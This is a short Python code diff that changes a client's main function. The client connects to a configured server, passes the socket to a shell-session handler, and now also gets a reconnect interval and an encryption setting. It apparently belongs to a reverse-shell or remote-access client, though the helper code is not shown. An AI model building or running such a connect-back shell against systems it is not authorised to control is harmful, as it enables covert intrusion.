@@ -13,14 +13,16 @@ def main():
     config = load_config()
     platform = get_platform()
 
-    def shell_callback(sock):
-        handle_session(sock, platform)
+    def shell_callback(sock, encryption):
+        handle_session(sock, platform, encryption)
 
     try:
         connect_and_run(
             config['server_host'],
             config['server_port'],
-            shell_callback
+            shell_callback,
+            config['reconnect_interval'],
+            config['encryption'],
         )
     except KeyboardInterrupt:
         sys.exit()
